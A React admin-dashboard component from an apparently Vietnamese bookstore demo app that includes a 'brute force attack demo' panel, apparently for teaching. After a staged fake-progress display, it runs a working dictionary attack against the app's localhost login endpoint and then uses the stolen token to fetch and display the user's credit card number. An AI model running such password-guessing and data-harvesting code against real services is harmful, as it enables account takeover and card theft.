import { useState, useContext } from 'react';
import { Navigate } from 'react-router-dom';
import { AuthContext } from '../context/AuthContext';

function AdminDashboard() {
    const { user, loading } = useContext(AuthContext);
    const [newBook, setNewBook] = useState({ title: '', author: 'Nguyễn Nhật Ánh', price: '', cover_image: '', description: '' });
    
    // Brute force state
    const [targetUser, setTargetUser] = useState('user1');
    const [attackLogs, setAttackLogs] = useState([]);
    const [isAttacking, setIsAttacking] = useState(false);
    const [exfiltratedData, setExfiltratedData] = useState(null);

    const commonPasswords = ['123', 'admin', 'password', 'qwerty', '123123', '123456', 'iloveyou', 'letmein', 'H.z050719'];

    if (loading) return <div>Đang tải...</div>;
    if (!user || user.role !== 'admin') return <Navigate to="/login" />;

    const handleAddBook = async (e) => {
        e.preventDefault();
        try {
            await fetch('http://localhost:3001/api/books', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(newBook)
            });
            alert('Thêm sách thành công!');
            setNewBook({ title: '', author: 'Nguyễn Nhật Ánh', price: '', cover_image: '', description: '' });
        } catch (err) {
            alert('Lỗi thêm sách');
        }
    };

    const runBruteForce = async () => {
        setIsAttacking(true);
        setAttackLogs([]);
        setExfiltratedData(null);
        let success = false;

        // -------------- REALISTIC SIMULATION PHASE --------------
        setAttackLogs(prev => [...prev, `[INIT] Khởi động module Brute Force (Hydra-Sim)...`]);
        setAttackLogs(prev => [...prev, `[INFO] Giao thức: HTTP POST | Mục tiêu: ${targetUser}`]);
        setAttackLogs(prev => [...prev, `[INFO] Khởi tạo 50 luồng (threads) tấn công đồng thời...`]);
        
        await new Promise(r => setTimeout(r, 800));

        let attempts = 0;
        const speed = 15420; // Simulated req/s
        
        // Spin random strings rapidly
        const intervalId = setInterval(() => {
            attempts += 1400;
            const randomPwd = Math.random().toString(36).slice(-8);
            const randomPwd2 = Math.random().toString(36).slice(-8);
            setAttackLogs(prev => {
                const newLogs = [...prev, 
                    `[THỬ] username: ${targetUser} | password: ${randomPwd}`,
                    `[THỬ] username: ${targetUser} | password: ${randomPwd2}`,
                    `[TRẠNG THÁI] Tốc độ: ~${speed} req/s | Đã thử: ${attempts} mật khẩu...`
                ];
                // Keep visually scrolling but limit array size to prevent lag
                if (newLogs.length > 15) return newLogs.slice(newLogs.length - 15);
                return newLogs;
            });
        }, 80);

        // Wait to simulate search time
        await new Promise(r => setTimeout(r, 2500));
        clearInterval(intervalId);

        setAttackLogs(prev => [...prev, `[BÁO CÁO] Đã thử ${attempts} tổ hợp. Không tìm thấy trong tập sinh ngẫu nhiên.`]);
        setAttackLogs(prev => [...prev, `[INFO] Chuyển hướng sang danh sách từ điển (Dictionary Attack)...`]);
        // --------------------------------------------------------

        // Now do the actual API checks
        for (let i = 0; i < commonPasswords.length; i++) {
            const pwd = commonPasswords[i];
            setAttackLogs(prev => {
                const newLogs = [...prev, `[TẤN CÔNG DICTIONARY] Thử nghiệm: ${pwd}`];
                if (newLogs.length > 15) return newLogs.slice(newLogs.length - 15);
                return newLogs;
            });
            
            await new Promise(r => setTimeout(r, 500)); // Delay per dictionary word

            try {
                const res = await fetch('http://localhost:3001/api/auth/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username: targetUser, password: pwd })
                });
                
                if (res.ok) {
                    const data = await res.json();
                    setAttackLogs(prev => [...prev, `[THÀNH CÔNG] Đã phá khóa! Mật khẩu là: ${pwd}`]);
                    
                    // Exfiltrate
                    const meRes = await fetch('http://localhost:3001/api/auth/me', {
                        headers: { 'Authorization': `Bearer ${data.token}` }
                    });
                    if (meRes.ok) {
                        const meData = await meRes.json();
                        setExfiltratedData({
                            username: meData.user.username,
                            fullName: meData.user.full_name,
                            creditCard: meData.user.credit_card
                        });
                        setAttackLogs(prev => [...prev, `[ĐÁNH CẮP] Khai thác thành công dữ liệu thẻ ngân hàng từ JWT Token.`]);
                    }
                    success = true;
                    break;
                } else {
                    setAttackLogs(prev => {
                        const newLogs = [...prev, `[THẤT BẠI] Từ khóa "${pwd}" không chính xác.`];
                        if (newLogs.length > 15) return newLogs.slice(newLogs.length - 15);
                        return newLogs;
                    });
                }
            } catch (err) {
                setAttackLogs(prev => [...prev, `[LỖI CỤC BỘ] ${err.message}`]);
            }
        }
        if (!success) {
            setAttackLogs(prev => [...prev, `[KẾT THÚC] Chiến dịch thất bại. Không bẻ khóa được tài khoản này.`]);
        }
        setIsAttacking(false);
    };

    return (
        <div style={{ padding: '2rem' }}>
            <h1 style={{ color: 'var(--color-primary)' }}>Bảng Điều Khiển Quản Trị Hệ Thống</h1>
            
            <div style={{ display: 'flex', gap: '2rem', marginTop: '2rem', flexWrap: 'wrap' }}>
                <div style={{ flex: '1 1 400px', background: 'rgba(255,255,255,0.05)', padding: '2rem', borderRadius: '12px' }}>
                    <h2 style={{ marginBottom: '1rem'}}>Thêm Sách Mới</h2>
                    <form onSubmit={handleAddBook} style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
                        <input className="form-input" placeholder="Tên sách" value={newBook.title} onChange={e => setNewBook({...newBook, title: e.target.value})} required/>
                        <input className="form-input" placeholder="Giá" type="number" value={newBook.price} onChange={e => setNewBook({...newBook, price: e.target.value})} required/>
                        <input className="form-input" placeholder="Link ảnh bìa" value={newBook.cover_image} onChange={e => setNewBook({...newBook, cover_image: e.target.value})}/>
                        <textarea className="form-input" placeholder="Mô tả" value={newBook.description} onChange={e => setNewBook({...newBook, description: e.target.value})} rows="4"></textarea>
                        <button className="btn-primary" type="submit">Thêm Sách</button>
                    </form>
                </div>

                <div style={{ flex: '1 1 500px', background: 'rgba(255,0,0,0.1)', border: '1px solid red', padding: '2rem', borderRadius: '12px' }}>
                    <h2 style={{ color: '#ff4444' }}>Demo Tấn Công Brute Force</h2>
                    <p style={{ marginBottom: '1rem', color: '#ff8888', lineHeight: '1.5' }}>Mô phỏng đợt tấn công dò mật khẩu vào các tài khoản bằng một từ điển mật khẩu phổ biến.</p>
                    <div style={{ display: 'flex', gap: '1rem', marginBottom: '1rem' }}>
                        <input className="form-input" value={targetUser} onChange={e => setTargetUser(e.target.value)} placeholder="Tên đăng nhập (vd: user1)"/>
                        <button className="btn-primary" style={{ background: '#ff4444', color: 'white', whiteSpace: 'nowrap' }} onClick={runBruteForce} disabled={isAttacking}>
                            {isAttacking ? 'Đang Tấn Công...' : 'Bắt Đầu'}
                        </button>
                    </div>

                    <div style={{ background: '#000', padding: '1rem', borderRadius: '8px', minHeight: '150px', maxHeight: '200px', overflowY: 'auto', fontFamily: 'monospace', color: '#0f0', fontSize: '0.9rem', lineHeight: '1.4' }}>
                        {attackLogs.map((log, i) => (
                            <div key={i}>{log}</div>
                        ))}
                        {attackLogs.length === 0 && <div style={{ color: '#666' }}>Chờ lệnh tấn công...</div>}
                    </div>

                    {exfiltratedData && (
                        <div style={{ marginTop: '1rem', padding: '1.5rem', background: 'rgba(255,255,255,0.05)', borderRadius: '8px', borderLeft: '4px solid #ff4444' }}>
                            <h3 style={{ color: '#ff4444', marginBottom: '1rem' }}>🔥 DỮ LIỆU ĐÃ BỊ ĐÁNH CẮP!</h3>
                            <p style={{ margin: '0.5rem 0' }}><strong>Username:</strong> {exfiltratedData.username}</p>
                            <p style={{ margin: '0.5rem 0' }}><strong>Họ Tên:</strong> {exfiltratedData.fullName}</p>
                            <p style={{ margin: '0.5rem 0' }}><strong>Thẻ Ngân Hàng:</strong> <span style={{ color: '#ffaa00', letterSpacing: '1px', fontSize: '1.2rem', fontFamily: 'monospace' }}>{exfiltratedData.creditCard}</span></p>
                        </div>
                    )}
                </div>
            </div>
        </div>
    );
}

export default AdminDashboard;
